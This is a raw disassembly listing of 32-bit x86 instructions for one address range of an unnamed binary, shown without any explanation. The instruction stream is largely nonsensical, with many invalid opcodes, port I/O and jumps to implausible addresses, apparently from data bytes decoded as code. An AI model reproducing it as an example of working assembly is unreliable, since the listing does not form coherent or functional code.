  405735:	add    dl,ah
  405737:	mov    ?,WORD PTR [esi+eax*1+0x1f74073e]
  40573e:	dec    edx
  40573f:	(bad)  
  405740:	enter  0xe0f4,0x3c
  405744:	popf   
  405745:	add    dl,al
  405747:	lahf   
  405748:	or     DWORD PTR [edx],edx
  40574a:	pop    edi
  40574b:	loope  0x405775
  40574d:	lods   al,BYTE PTR ds:[si]
  40574f:	mov    esi,0x45874ccd
  405754:	ins    DWORD PTR es:[edi],dx
  405755:	cmp    al,0xd3
  405757:	push   0x20
  405759:	cdq    
  40575a:	mov    al,0x21
  40575c:	pop    ds
  40575d:	pop    eax
  40575e:	dec    ecx
  40575f:	xchg   ecx,eax
  405760:	dec    ebx
  405761:	sub    al,0x4
  405763:	xor    ebx,DWORD PTR [eax-0x5c009f1a]
  405769:	inc    edi
  40576a:	ins    BYTE PTR es:[edi],dx
  40576b:	mov    ds:0x5aae3291,eax
  405770:	push   esp
  405771:	mov    ecx,0x43c91e04
  405776:	mov    bl,BYTE PTR [eax+0x58]
  405779:	jmp    0x4be8:0xcb6b9150
  405780:	jne    0x4057db
  405782:	shl    DWORD PTR [edi+0x76],cl
  405785:	add    al,0x47
  405787:	and    eax,0xd3b8f319
  40578c:	cmp    esp,ecx
  40578e:	add    eax,0x9208b978
  405793:	inc    edi
  405794:	or     edx,DWORD PTR [eax]
  405796:	push   ds
  405797:	push   cs
  405798:	call   0x96ab226a
  40579d:	ins    DWORD PTR es:[edi],dx
  40579e:	stos   DWORD PTR es:[edi],eax
  40579f:	adc    eax,0x3b0baa5f
  4057a4:	std    
  4057a5:	add    DWORD PTR [ecx+0x3c],0x6a
  4057a9:	add    al,0x56
  4057ab:	js     0x4057a5
  4057ad:	sbb    DWORD PTR [esi+0x25a8689d],ecx
  4057b3:	or     al,BYTE PTR [edx+edi*4-0x68]
  4057b7:	mov    eax,0xbeb1002f
  4057bc:	jns    0x405785
  4057be:	add    edx,DWORD PTR [ebp+0x4a]
  4057c1:	jne    0x4057b7
  4057c3:	sbb    esi,DWORD PTR es:[edx-0x28]
  4057c7:	push   0x3
  4057c9:	sub    ah,ah
  4057cb:	test   eax,0x1a3854fa
  4057d0:	inc    eax
  4057d1:	pop    esi
  4057d2:	in     al,dx
  4057d3:	push   esi
  4057d4:	retf   
  4057d5:	sub    BYTE PTR [ebx+0x45873177],dl
  4057db:	inc    esp
  4057dc:	sbb    dl,dh
  4057de:	or     edi,DWORD PTR [edx+0x1c2f93d6]
  4057e4:	fs fwait
  4057e6:	push   ecx
  4057e7:	jbe    0x4057af
  4057e9:	clc    
  4057ea:	in     al,dx
  4057eb:	xchg   ebx,eax
  4057ec:	iret   
  4057ed:	xchg   esi,eax
  4057ee:	pop    esp
  4057ef:	ror    BYTE PTR [ecx],cl
  4057f1:	clc    
  4057f2:	ret    0x820f
  4057f5:	adc    ebx,ebx
  4057f7:	rol    BYTE PTR gs:[ecx+eax*1-0x51],1
  4057fc:	or     al,0x15
  4057fe:	repz push 0xffffffd4
  405801:	xor    eax,0x5988d1eb
  405806:	xor    eax,0x5b816ae5
  40580b:	xor    eax,0x472c9eb5
  405810:	stos   BYTE PTR es:[edi],al
  405811:	sub    al,0xf
  405813:	lods   eax,DWORD PTR ds:[esi]
  405814:	in     al,0xd8
  405816:	mov    ds:0xee1d716,eax
  40581b:	adc    al,0xcb
  40581e:	push   0xffffffa4
  405820:	push   ds
  405821:	int    0xc0
  405823:	mov    esp,cs
  405825:	add    eax,0x7ea8eda9
  40582a:	pop    ebx
  40582b:	xor    DWORD PTR [edi-0x7b0d54e9],0xffffffd4
  405832:	mov    ecx,DWORD PTR ds:0x8b2e2440
  405838:	shl    DWORD PTR [edx+0x5],cl
  40583b:	and    esi,DWORD PTR [esp+edx*4-0x63]
  40583f:	lock js 0x4057ef
  405842:	push   es
  405843:	fwait
  405844:	and    al,0x8b
  405846:	lock push esi
  405848:	add    esp,ebp
  40584a:	or     eax,edx
  40584c:	jne    0x4058cd
  40584e:	aas    
  40584f:	test   al,0xba
  405851:	lock (bad) 
  405853:	lea    eax,[ecx+edi*4-0x14]
  405857:	xor    esi,DWORD PTR [edi+0x7b]
  40585a:	sub    BYTE PTR [esi+0xf],0x25
  40585e:	mov    edx,0x668118fc
  405863:	inc    eax
  405864:	push   es
  405865:	sti    
  405866:	jmp    0x4058e6
  405868:	mov    edx,0x4259400
  40586d:	adc    DWORD PTR [edi],ebp
  40586f:	push   ebp
  405870:	sub    cl,al
  405872:	adc    BYTE PTR [esp+ebp*1+0x18ba5693],dl
  405879:	fsub   DWORD PTR [edi+eax*4]
  40587c:	mov    al,0x94
  40587e:	dec    ebp
  40587f:	and    al,0x94
  405881:	xor    ah,dh
  405883:	loope  0x405815
  405885:	out    dx,al
  405886:	repnz pop ecx
  405888:	je     0x40588e
  40588a:	jne    0x40589a
  40588c:	sbb    dh,BYTE PTR [eax]
  40588e:	jmp    0x405892
  405890:	jno    0x4058dc
  405892:	push   es
  405893:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405894:	in     al,dx
  405895:	in     al,dx
  405896:	jle    0x1103226b
  40589c:	and    ch,BYTE PTR [edx]
  40589e:	fst    QWORD PTR [ebx+0x62c868ec]
  4058a4:	and    eax,0x6fa03127
  4058a9:	push   ss
  4058aa:	xchg   ebx,eax
  4058ab:	jae    0x4058d8
  4058ad:	or     esp,DWORD PTR [edi-0x2c]
  4058b0:	dec    ebp
  4058b1:	push   es
  4058b2:	int    0x7f
  4058b4:	(bad)  
  4058b5:	add    BYTE PTR gs:[eax],al
  4058b8:	mov    al,0x78
  4058ba:	outs   dx,DWORD PTR ds:[esi]
  4058bb:	sbb    DWORD PTR [ebx+0x1c6b11c0],esp
  4058c1:	inc    esp
  4058c2:	push   edi
  4058c3:	xor    DWORD PTR [ecx+0x2d],ebx
  4058c6:	cmp    eax,DWORD PTR [eax]
  4058c8:	in     eax,0x3
  4058ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058cb:	scas   eax,DWORD PTR es:[edi]
  4058cc:	imul   esp,DWORD PTR [ebx+edi*8+0x21fe8946],0xffffff9a
  4058d4:	push   0x1c
  4058d6:	lea    eax,[ebp-0x719c0334]
  4058dc:	mov    esp,eax
  4058de:	out    0x3e,eax
  4058e0:	aam    0x81
  4058e2:	mov    ebp,0x752d0cdc
  4058e7:	sbb    al,0x53
  4058e9:	out    dx,eax
  4058ea:	std    
  4058eb:	and    bh,BYTE PTR [eax]
  4058ed:	jmp    0x1123:0x24d085a5
  4058f4:	xor    BYTE PTR [eax+0x231c8c86],dh
  4058fa:	sbb    esp,DWORD PTR ds:0x2ecd8e0
  405900:	sbb    dh,bl
  405902:	test   BYTE PTR [eax],dh
  405904:	jecxz  0x4058b2
  405906:	push   ebp
  405907:	out    dx,eax
  405908:	add    bl,BYTE PTR [esi-0x40cd4ad5]
  40590e:	es mov esp,0xb2f51b2d
  405914:	pop    esp
  405915:	imul   edx,DWORD PTR [ebx-0x110f0be],0x9d1ba9ff
  40591f:	xor    al,0x94
  405921:	add    DWORD PTR [edi+eax*1+0x15954095],edx
  405928:	xor    eax,0xf807d830
  40592d:	xlat   BYTE PTR ds:[ebx]
  40592e:	adc    eax,0xcec74102
  405933:	inc    eax
  405934:	sbb    al,0x22
  405936:	mov    al,0x71
  405938:	sub    DWORD PTR ds:0xab111222,ecx
  40593e:	out    dx,al
  40593f:	mov    ds:0x68277406,eax
  405945:	aam    0x12
  405947:	scas   al,BYTE PTR es:[edi]
  405948:	add    al,0xf
  40594a:	mov    di,0x1651
  40594e:	cs je  0x405959
  405951:	mov    eax,0x6c3a39d4
  405956:	push   ebx
  405957:	icebp  
  405958:	jl     0x4058ef
  40595a:	cld    
  40595b:	cld    
  40595c:	inc    ecx
  40595d:	inc    eax
  40595e:	add    al,0x9e
  405960:	ins    BYTE PTR es:[edi],dx
  405961:	sbb    al,0x2
  405963:	ror    DWORD PTR [eax+0x43],0x5e
  405967:	xchg   ebp,eax
  405968:	sti    
  405969:	fiadd  DWORD PTR [edi]
  40596b:	cmp    BYTE PTR [eax],al
  40596d:	inc    ecx
  40596e:	and    BYTE PTR [esp+ebp*1-0xdfa76f4],bh
  405975:	mov    ebp,0xc6fc65e6
  40597a:	test   DWORD PTR [eax-0x53ed61fc],ebp
  405980:	xchg   ecx,eax
  405981:	lods   eax,DWORD PTR ds:[esi]
  405982:	sub    esi,DWORD PTR [ebx]
  405984:	mov    al,0xf9
  405986:	hlt    
  405987:	(bad)  
  405989:	leave  
  40598a:	enter  0x9ae6,0xb8
  40598e:	add    eax,0xc0bc1f85
  405993:	lahf   
  405994:	cmp    esp,DWORD PTR [ebx]
  405996:	(bad)  
  405998:	pinsrw mm1,eax,0x55
  40599c:	sub    BYTE PTR [edx+0x77],0x64
  4059a0:	jecxz  0x405a0f
  4059a2:	dec    ebx
  4059a3:	lea    ecx,[ebx-0x7fa2f7ec]
  4059a9:	push   es
  4059aa:	out    dx,al
  4059ab:	sbb    edx,DWORD PTR [edx]
  4059ad:	mov    eax,0x2e004abd
  4059b2:	add    eax,esp
  4059b4:	sub    DWORD PTR [edx],esi
  4059b6:	or     edx,DWORD PTR [esp+edi*4-0x23de48f]
  4059bd:	shr    BYTE PTR [eax+ecx*2-0x575ec3bc],1
  4059c4:	ror    BYTE PTR [esi+ebx*2],0xa1
  4059c8:	cmp    edi,eax
  4059ca:	xor    dl,al
  4059cc:	call   0x425b67c4
  4059d1:	sbb    DWORD PTR [eax+ebx*8-0x18b0afbc],ebp
  4059d8:	mov    dh,BYTE PTR [ebp+0x4]
  4059db:	dec    eax
  4059dc:	iret   
  4059dd:	mov    ah,0x10
  4059df:	add    al,0x4c
  4059e1:	mov    ch,BYTE PTR [edi-0x5]
  4059e4:	bound  ebx,QWORD PTR [ecx+ecx*1+0x50]
  4059e8:	jnp    0x4059de
  4059ea:	sbb    al,0xa4
  4059ec:	pop    eax
  4059ed:	cmp    ecx,ecx
  4059ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059f0:	mov    al,BYTE PTR [ebx-0x24]
  4059f3:	pushf  
  4059f4:	xchg   esi,eax
  4059f5:	dec    ecx
  4059f6:	sbb    ch,BYTE PTR [esi]
  4059f8:	je     0x4059b1
  4059fa:	dec    edx
  4059fb:	imul   ebp,DWORD PTR [edx+0x40],0x1c
  4059ff:	or     BYTE PTR [edi],ch
  405a01:	enter  0xb1f3,0x42
  405a05:	mov    esp,0x19106840
  405a0a:	and    ch,BYTE PTR [ebx-0x39]
  405a0d:	sub    BYTE PTR [eax+0x62],bh
  405a10:	pop    ebp
  405a11:	inc    esp
  405a12:	add    al,0xb1
  405a14:	add    ecx,DWORD PTR [eax+0x15]
  405a17:	cmova  edx,DWORD PTR [edx-0x75]
  405a1b:	stos   DWORD PTR es:[edi],eax
  405a1c:	out    0x68,eax
  405a1e:	or     DWORD PTR [edx-0x4],ecx
  405a21:	or     dh,cl
  405a23:	and    al,0xa4
  405a25:	xchg   edi,eax
  405a26:	push   0xcf542362
  405a2b:	fimul  DWORD PTR [edx-0x3fbb873]
  405a31:	call   DWORD PTR [esi-0x6201e960]
  405a37:	bndldx (bad),[esp+eiz*2+0x5a2a058f]
  405a3f:	and    DWORD PTR [eax-0x4],edi
  405a42:	add    DWORD PTR [edi+eax*1],edx
  405a45:	adc    bl,al
  405a47:	adc    cl,bh
  405a49:	inc    eax
  405a4a:	xchg   ebx,eax
  405a4b:	ret    0x1856
  405a4e:	enter  0x9736,0x51
  405a52:	ss dec ebp
  405a54:	push   esp
  405a55:	and    dh,ah
  405a57:	sbb    al,0xcf
  405a59:	(bad)  
  405a5a:	int3   
  405a5b:	pop    es
  405a5c:	bound  esp,QWORD PTR [eax+0xa]
  405a5f:	pop    ebx
  405a60:	leave  
  405a61:	dec    ecx
  405a62:	inc    edx
  405a63:	cmp    eax,0x21de7d97
  405a68:	in     al,dx
  405a69:	(bad)  
  405a6a:	fdivr  DWORD PTR [ebx+0x20650457]
  405a70:	pop    ebx
  405a71:	gs es (bad) 
  405a74:	mov    ebx,0x705acbd
  405a79:	jb     0x405a7f
  405a7b:	cwde   
  405a7c:	(bad)  
  405a7d:	repz push esp
  405a7f:	dec    esi
  405a80:	popa   
  405a81:	xor    eax,edi
  405a83:	cmp    dl,cl
  405a85:	enter  0x980b,0x90
  405a89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a8b:	and    edx,ebp
  405a8d:	clc    
  405a8e:	int    0xac
  405a90:	mov    cl,bh
  405a92:	and    ah,BYTE PTR [edi-0x66f38780]
  405a98:	inc    BYTE PTR [ebp+ebx*8+0x7d]
  405a9c:	and    ah,ch
  405a9e:	ret    
  405a9f:	cmp    al,0x45
  405aa1:	push   cs
  405aa2:	or     DWORD PTR [esp+eax*8+0x52],edx
  405aa6:	arpl   WORD PTR gs:[eax],cx
  405aa9:	inc    esp
  405aaa:	mov    ch,0xb0
  405aac:	add    BYTE PTR [eax-0x754bfe30],bh
  405ab2:	mov    bl,0x7a
  405ab4:	jno    0x405a4e
  405ab6:	call   DWORD PTR [edx]
  405ab8:	lea    ebp,[eax+0x48]
  405abb:	mov    WORD PTR [esi+0x6],fs
  405abe:	jg     0x405ac9
  405ac0:	cmp    esi,DWORD PTR [ebx*8+0x6ff994f4]
  405ac7:	add    ebx,DWORD PTR [ebp+0x150df175]
  405acd:	mov    ecx,DWORD PTR [ebx*8-0x602be408]
  405ad4:	dec    ebx
  405ad5:	and    eax,0x9c865860
  405ada:	jmp    0x405af9
  405adc:	mov    al,0xc6
  405ade:	fsub   DWORD PTR [ebp+0x542253da]
  405ae4:	cld    
  405ae5:	outs   dx,DWORD PTR ds:[esi]
  405ae6:	(bad)  
  405ae7:	repz push ds
  405ae9:	sbb    esp,ecx
  405aeb:	or     ebx,DWORD PTR [edi+eax*4]
  405aee:	retf   
  405aef:	jo     0x405afd
  405af1:	pop    ecx
  405af2:	pop    edx
  405af3:	pop    ds
  405af4:	mov    esp,0x122c017f
  405af9:	cmc    
  405afa:	or     dl,BYTE PTR [eax+ebp*8-0x80]
  405afe:	push   0x5386e0d7
  405b03:	sub    al,dl
  405b05:	dec    dl
  405b07:	outs   dx,BYTE PTR ds:[esi]
  405b08:	add    edx,DWORD PTR [eax]
  405b0a:	dec    edx
  405b0b:	pop    es
  405b0c:	xchg   edi,eax
  405b0d:	sub    bl,dh
  405b0f:	sub    DWORD PTR [esi],edx
  405b11:	jb     0x405b25
  405b13:	dec    edi
  405b14:	adc    eax,0xc40858c
  405b19:	sahf   
  405b1a:	ins    DWORD PTR es:[edi],dx
  405b1b:	jmp    0x405b48
  405b1d:	pop    es
  405b1e:	nop
  405b1f:	and    esi,DWORD PTR [ecx]
  405b21:	jae    0x405aa8
  405b23:	mov    cs,WORD PTR [ebx-0xb]
  405b26:	adc    al,0xf2
  405b28:	test   al,0x48
  405b2a:	xchg   edi,eax
  405b2b:	imul   eax,DWORD PTR [ebp+0x16eecadd],0x39
  405b32:	jmp    0x405b3b
  405b34:	or     BYTE PTR [eax-0x163db8ac],cl
  405b3a:	repz add eax,0x73b944cf
  405b40:	fwait
  405b41:	loopne 0x405b44
  405b43:	int    0xfa
  405b45:	adc    BYTE PTR [ebp+0x68bef0fc],0x49
  405b4c:	jbe    0x405b02
  405b4e:	enter  0x7399,0x42
  405b52:	rcr    DWORD PTR [eax-0x7d54fbd2],cl
  405b58:	and    BYTE PTR [ecx+0xa0b779c],0xd1
  405b5f:	and    BYTE PTR [ebp+0x2ca98bfc],bl
  405b65:	xchg   edi,eax
  405b66:	ins    DWORD PTR es:[edi],dx
  405b67:	imul   ecx,DWORD PTR [ebx],0xffffffc5
  405b6a:	in     al,dx
  405b6b:	push   es
  405b6c:	lock jge 0x405b63
  405b6f:	clc    
  405b70:	daa    
  405b71:	jns    0x405ba6
  405b73:	xor    eax,0x2a4be48f
  405b78:	loopne 0x405b1b
  405b7a:	les    ecx,FWORD PTR [ebp-0x20]
  405b7d:	and    al,0xa2
  405b7f:	xchg   ebx,eax
  405b80:	or     eax,0xd85f6818
  405b85:	popa   
  405b86:	add    BYTE PTR [edx],al
  405b88:	sar    BYTE PTR [edi+ecx*8+0x1462e099],1
  405b8f:	pop    ds
  405b90:	js     0x405b56
  405b92:	call   0xccca4ed5
  405b97:	out    dx,al
  405b98:	data16 mov cl,0x4d
  405b9b:	lds    ebp,FWORD PTR [ebp+0x0]
  405b9e:	mov    esp,0x288928bb
  405ba3:	(bad)  
  405ba4:	call   0x7d68b802
  405ba9:	rol    DWORD PTR [eax+eiz*8],0x89
  405bad:	aam    0x4f
  405baf:	sahf   
  405bb0:	sub    al,0x4c
  405bb2:	pop    ds
  405bb3:	addr16 fmul st(0),st
  405bb6:	pop    edi
  405bb7:	pop    eax
  405bb8:	call   0x6781a3ef
  405bbd:	xor    eax,0xe4592d00
  405bc2:	(bad)  
  405bc3:	mov    WORD PTR [ebx+edx*2],cs
  405bc6:	push   ebp
  405bc7:	cmp    al,0x48
  405bc9:	je     0x405c13
  405bcb:	jmp    0x405c22
  405bcd:	addr16 fs nop
  405bd0:	aas    
  405bd1:	xor    esi,DWORD PTR [edi+esi*1-0x15]
  405bd5:	inc    edi
  405bd6:	xor    eax,0x66ff6c28
  405bdb:	in     al,0x16
  405bdd:	jmp    0x405c0e
  405bdf:	and    eax,0xb021eb1d
  405be4:	add    eax,ebx
  405be6:	mov    al,0x4
  405be8:	add    al,BYTE PTR ds:0xb2cb2cb2
  405bee:	push   es
  405bef:	pop    es
  405bf0:	or     BYTE PTR [ecx],cl
  405bf2:	or     edx,DWORD PTR [edx-0x4c]
  405bf5:	sub    al,0xcb
  405bf7:	or     al,0xd
  405bf9:	push   cs
  405bfa:	push   ss
  405bfb:	scas   eax,DWORD PTR es:[edi]
  405bfc:	or     dl,BYTE PTR [ebx+0x188a4e11]
  405c02:	test   al,0x8b
  405c04:	mov    edi,ecx
  405c06:	inc    eax
  405c07:	out    0x81,al
  405c09:	push   ebx
  405c0a:	mov    WORD PTR [esi+0x8],es
  405c0d:	loop   0x405b9b
  405c0f:	mov    WORD PTR [ebp+eax*1-0x50],gs
  405c13:	test   al,0xac
  405c15:	cmp    ah,BYTE PTR [edx]
  405c17:	enter  0x3db1,0x77
  405c1b:	pushf  
  405c1c:	gs pop eax
  405c1e:	in     al,0xc3
  405c20:	(bad)  
  405c21:	sub    eax,0x7d147b92
  405c26:	setae  BYTE PTR [esi*8+0x109c9381]
  405c2e:	mov    ds:0xf7184388,al
  405c33:	mov    eax,0xc481c095
  405c38:	repnz or ecx,DWORD PTR [eax+edx*2]
  405c3c:	in     eax,0x17
  405c3e:	aad    0x33
  405c40:	les    edi,FWORD PTR [ebp-0x14]
  405c43:	jo     0x405bca
  405c45:	mov    dh,0x8c
  405c47:	add    DWORD PTR [esi+eax*1],ecx
  405c4a:	test   eax,0xdae047d7
  405c4f:	jmp    0x405bd3
  405c51:	sbb    DWORD PTR [edi+0x32a49970],esp
  405c57:	les    ebx,FWORD PTR [edx-0x127f96f]
  405c5d:	dec    BYTE PTR [ebp-0xafa6c73]
  405c63:	sbb    ah,BYTE PTR [ecx]
  405c65:	sub    eax,0xdd838be4
  405c6a:	mov    ebp,0x10b51560
  405c6f:	push   edi
  405c70:	dec    esp
  405c71:	mov    eax,eax
  405c73:	mov    esp,0x633418d8
  405c78:	cmp    eax,eax
  405c7a:	or     edx,DWORD PTR [edx]
  405c7c:	les    ecx,FWORD PTR [edi]
  405c7e:	es and ebx,ebx
  405c81:	leave  
  405c82:	enter  0x59f8,0xcc
  405c86:	sar    BYTE PTR [esi-0x53],1
  405c89:	add    ecx,esi
  405c8b:	data16 mov es,WORD PTR [esi-0xa]
  405c8f:	mov    eax,ds:0xbc7649b8
  405c94:	leave  
  405c95:	ror    DWORD PTR [ebp+0x5da03c0f],0xc6
  405c9c:	into   
  405c9d:	fcomp  st(0)
  405c9f:	jmp    0x405cfe
  405ca1:	cwde   
  405ca2:	nop
  405ca3:	ds xchg esp,eax
  405ca5:	pop    esi
  405ca6:	cwde   
  405ca7:	xchg   ebx,eax
  405ca8:	xchg   ecx,eax
  405ca9:	dec    ecx
  405caa:	inc    esi
  405cab:	pushf  
  405cac:	mov    al,ds:0x96792ea4
  405cb1:	xchg   ecx,eax
  405cb2:	nop
  405cb3:	add    cl,BYTE PTR [esp+ecx*4+0x4058798c]
  405cba:	dec    edx
  405cbb:	add    DWORD PTR [esi-0x64],edi
  405cbe:	mov    al,0x8e
  405cc0:	xor    BYTE PTR [esp+ecx*4+0x6a03ba91],ah
  405cc7:	xchg   edx,eax
  405cc8:	sub    al,BYTE PTR [ebx-0x3a]
  405ccb:	scas   al,BYTE PTR es:[edi]
  405ccc:	aad    0xdf
  405cce:	or     BYTE PTR [eax+0x56],0xc1
  405cd2:	imul   eax,DWORD PTR [edi],0xffffff8c
  405cd5:	and    eax,0x9d43914f
  405cda:	push   es
  405cdb:	rol    BYTE PTR [ebx-0x5c8ee449],1
  405ce1:	ret    0xea57
  405ce4:	or     bh,dh
  405ce6:	sbb    eax,0x730a074a
  405ceb:	std    
  405cec:	outs   dx,BYTE PTR ds:[esi]
  405ced:	add    esp,DWORD PTR [edx+eiz*1+0x553bf1c1]
  405cf4:	xor    esi,DWORD PTR [eax+0x409a4159]
  405cfa:	ror    DWORD PTR [edx],1
  405cfc:	xor    BYTE PTR [edi+0x6b],dh
  405cff:	frstor [edi+ebx*2]
  405d02:	xchg   esi,eax
  405d03:	hlt    
  405d04:	add    al,dh
  405d06:	mov    eax,ds:0xcff0f38c
  405d0b:	adc    BYTE PTR [esi],ch
  405d0d:	stc    
  405d0e:	inc    ebp
  405d0f:	xchg   edx,eax
  405d10:	pop    ecx
  405d11:	xor    BYTE PTR [eax+0x2ac30658],bh
  405d17:	sub    BYTE PTR [ebp*1-0x1a823fc0],bl
  405d1e:	inc    esi
  405d1f:	enter  0x9d4a,0xcb
  405d23:	enter  0x15d4,0x2b
  405d27:	jmp    0x720e:0xbd0b1e11
  405d2e:	mov    dl,0xc7
  405d30:	int3   
  405d31:	add    al,0x58
  405d33:	mov    ds:0x1c873687,eax
  405d38:	mov    ecx,0x8cf46816
  405d3d:	pop    esp
  405d3e:	nop
  405d3f:	mov    eax,ds:0x2d6b6498
  405d44:	in     eax,0x2c
  405d46:	fcomp  st(0)
  405d48:	loopne 0x405d54
  405d4a:	clc    
  405d4b:	fld    TBYTE PTR [esp+ecx*2]
  405d4e:	jae    0x405da4
  405d50:	popf   
  405d51:	rol    ch,0x7f
  405d54:	mov    eax,ds:0xb1cd2397
  405d59:	lock and bl,BYTE PTR [edx+ebx*4-0x47637704]
  405d61:	call   0x9f781c9e
  405d66:	cdq    
  405d67:	js     0x405d5d
  405d69:	add    bh,BYTE PTR [eax-0x77f365fc]
  405d6f:	repz fbld TBYTE PTR [ebp+0x720fa877]
  405d76:	mov    dl,0x1a
  405d78:	mov    eax,ds:0xb145c607
  405d7d:	inc    esi
  405d7e:	add    DWORD PTR [eax-0x29d26ff8],ecx
  405d84:	push   ds
  405d85:	push   esi
  405d86:	(bad)  
  405d87:	(bad)  
  405d88:	and    dl,BYTE PTR [eax+0x6437a227]
  405d8e:	nop
  405d8f:	or     BYTE PTR [ebx-0x14],ch
  405d92:	xor    eax,0x9b227324
  405d97:	mov    ds:0x43089910,eax
  405d9c:	push   cs
  405d9d:	cmp    esp,esp
  405d9f:	shl    al,0xfc
  405da2:	xchg   esp,eax
  405da3:	dec    ebx
  405da4:	xchg   ecx,ecx
  405da6:	js     0x405d9c
  405da8:	adc    esi,DWORD PTR [eax+0x5c86ff6c]
  405dae:	aam    0x16
  405db0:	gs xchg esp,eax
  405db2:	les    esi,FWORD PTR [ecx+0x15]
  405db5:	lahf   
  405db6:	sub    ah,cl
  405db8:	inc    ebx
  405db9:	mov    esp,0x9abca374
  405dbe:	stc    
  405dbf:	in     al,0xae
  405dc1:	and    al,0x8
  405dc3:	add    al,0xa3
  405dc5:	ror    BYTE PTR [eax],0xa3
  405dc8:	les    ecx,FWORD PTR [esi-0x1de7d35]
  405dce:	pop    ss
  405dcf:	add    DWORD PTR [ebp+0x10],esi
  405dd2:	pop    es
  405dd3:	stc    
  405dd4:	jmp    DWORD PTR [ebx-0x46e509c5]
  405dda:	enter  0x610,0xf
  405dde:	or     bh,BYTE PTR [eax-0x6f2fb34]
  405de4:	push   esi
  405de5:	xchg   esp,eax
  405de6:	cmp    eax,0x80b914
  405deb:	fdiv   QWORD PTR [ebp-0x10a011a9]
  405df1:	sar    BYTE PTR [ebx+0x62],0x66
  405df5:	cmp    BYTE PTR [esi+eax*2],0x2d
  405df9:	add    BYTE PTR [ebp-0xf],bl
  405dfc:	pusha  
  405dfd:	addr16 adc al,0x48
  405e00:	ins    DWORD PTR es:[edi],dx
  405e01:	lock or edx,DWORD PTR [edi]
  405e04:	dec    esp
  405e05:	jp     0x405df2
  405e07:	dec    eax
  405e08:	mov    esi,edi
  405e0a:	dec    esi
  405e0b:	pushf  
  405e0c:	dec    esi
  405e0d:	lahf   
  405e0e:	mov    bl,0xbf
  405e10:	push   eax
  405e11:	xor    BYTE PTR [edx],dl
  405e13:	mov    cl,BYTE PTR [eax+esi*1]
  405e16:	and    ecx,0xe9720d1f
  405e1c:	mov    BYTE PTR [eax+0x4b],ch
  405e1f:	adc    al,0x2
  405e21:	into   
  405e22:	adc    bh,BYTE PTR [edi+0x9]
  405e25:	loop   0x405e16
  405e27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e28:	jns    0x405e2f
  405e2a:	dec    ecx
  405e2b:	or     ecx,0xfffffffe
  405e2e:	inc    ecx
  405e2f:	add    DWORD PTR [edx+esi*4],0x2
  405e33:	jmp    0x405e48
  405e35:	mov    dl,ch
  405e37:	mov    al,ds:0x3804d84c
  405e3c:	dec    ecx
  405e3d:	add    ah,BYTE PTR [esi]
  405e3f:	mov    bl,BYTE PTR [ecx]
  405e41:	pushf  
  405e42:	add    DWORD PTR [ebx+0x56],edi
  405e45:	adc    al,BYTE PTR [ebx+0x28]
  405e48:	dec    edx
  405e49:	int3   
  405e4a:	popf   
  405e4b:	dec    edi
  405e4c:	xor    BYTE PTR [esi-0x1bbf89df],0x8e
  405e53:	aam    0x77
  405e55:	xor    ecx,ecx
  405e57:	sbb    eax,0x1d88adb2
  405e5c:	pop    es
  405e5d:	adc    esp,DWORD PTR ds:0xf60a3bc1
  405e63:	and    ah,al
  405e65:	lods   al,BYTE PTR ds:[esi]
  405e66:	lock jle 0x405e72
  405e69:	or     ah,BYTE PTR [ecx+0x168b98e2]
  405e6f:	or     cl,BYTE PTR [edi-0x2ba45850]
  405e75:	add    ecx,DWORD PTR [esi+ebx*4]
  405e78:	in     eax,dx
  405e79:	mov    ds:0x86020d46,al
  405e7e:	inc    ebp
  405e7f:	ds scas eax,DWORD PTR es:[edi]
  405e81:	mov    esi,0xefb0e01d
  405e86:	pop    eax
  405e87:	xor    BYTE PTR [eax+eiz*1+0x257cfb3b],ch
  405e8e:	pop    ebx
  405e8f:	nop
  405e90:	and    eax,DWORD PTR [ecx]
  405e92:	sbb    ecx,DWORD PTR ds:0x46d895
  405e98:	pop    ebx
  405e99:	adc    ebx,DWORD PTR [ecx+0xe7d2445]
  405e9f:	fs aam 0x2c
  405ea2:	stos   BYTE PTR es:[edi],al
  405ea3:	das    
  405ea4:	sbb    eax,DWORD PTR [ebx]
  405ea6:	dec    esp
  405ea7:	adc    ebp,DWORD PTR [edx]
  405ea9:	inc    eax
  405eaa:	cmp    al,0xfc
  405eac:	dec    edx
  405ead:	mov    dh,0x23
  405eaf:	shl    DWORD PTR [ecx+eiz*1],0x46
  405eb3:	push   esp
  405eb4:	pop    ds
  405eb5:	retf   0xbffd
  405eb8:	in     al,0xc7
  405eba:	cmp    ebx,DWORD PTR [ebp-0xc]
  405ebd:	jge    0x405ec4
  405ebf:	cmp    esi,DWORD PTR [ebp-0x4]
  405ec2:	jl     0x405e99
  405ec4:	add    al,0x93
  405ec6:	dec    esp
  405ec7:	fst    DWORD PTR [edi-0x23]
  405eca:	push   cs
  405ecb:	push   ds
  405ecc:	xor    ecx,DWORD PTR [eax+ecx*2]
  405ecf:	push   0x17
  405ed1:	loopne 0x405f45
  405ed3:	test   DWORD PTR [eax-0x7fe7761e],0x17301162
  405edd:	inc    edi
  405ede:	cwde   
  405edf:	mov    WORD PTR [edx],ds
  405ee1:	adc    BYTE PTR [ecx+0x4a],cl
  405ee4:	aad    0x3f
  405ee6:	add    bl,BYTE PTR [esi]
  405ee8:	jbe    0x405e8b
  405eea:	xor    BYTE PTR [esi+0x37],bh
  405eed:	repnz cs push esp
  405ef0:	stos   DWORD PTR es:[edi],eax
  405ef1:	cli    
  405ef2:	pop    ecx
  405ef3:	and    al,0x28
  405ef5:	and    BYTE PTR [eax-0x2ac4b4f4],dl
  405efb:	inc    eax
  405efc:	xor    BYTE PTR [ecx],bl
  405efe:	jno    0x405f7f
  405f00:	or     al,0xb6
  405f02:	jg     0x405ea8
  405f04:	add    BYTE PTR [edx-0xf72c99],bh
  405f0a:	add    al,0x3
  405f0c:	sub    eax,0x458b2980
  405f11:	dec    ebp
  405f12:	arpl   WORD PTR [esi+0x36],ax
  405f15:	and    al,0x80
  405f17:	leave  
  405f18:	ins    BYTE PTR es:[edi],dx
  405f19:	or     DWORD PTR [edx+0x67],edx
  405f1c:	rol    DWORD PTR gs:[edx+0x5f66261c],0x65
  405f24:	and    ebx,DWORD PTR [ebx]
  405f26:	in     al,dx
  405f27:	jge    0x405f38
